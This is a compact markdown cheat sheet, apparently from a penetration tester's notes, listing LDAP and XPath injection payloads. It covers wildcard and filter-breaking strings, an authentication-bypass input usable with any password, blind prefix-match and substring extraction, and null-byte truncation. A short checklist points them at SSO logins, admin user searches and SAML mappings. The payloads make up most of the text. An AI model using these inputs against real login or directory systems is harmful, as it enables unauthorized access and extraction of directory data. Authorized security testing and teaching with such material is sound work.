# LDAP and XPath Injection

Two string-based query languages with a small grammar and a large blast radius.

---

## LDAP

Login and directory search are the usual homes.

```
*                       wildcard, matches all
*)(uid=*               close and reopen the filter
admin)(&(uid=*         
*)(|(uid=*             
)(cn=*))(|(cn=*        
```

Auth bypass: `user=*)(uid=*))(|(uid=*` with any password.
Blind: `user=a*` (prefix match), then `ab*`, binary search.

Null byte truncation: `admin)\x00`.

---

## XPath

```
' or '1'='1
' or 1=1 or 'a'='a
x' or name()='username' or 'x'='x
' or string-length(name(/*[1]))=5 and '1'='1
```

Blind extraction uses `string-length`, `substring`, `count`, and `name()`.

---

## Where they appear

- Corporate SSO login (LDAP bind).
- "Search users" in an admin panel.
- XML-backed config lookups (XPath).
- SAML attribute mapping.

---

## Go deeper

1. Test `*` in the username with an empty password.
2. Test `)(` and `|` to break the filter group.
3. Test the search field, not just login.
4. Test blind with prefix matching and timing.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
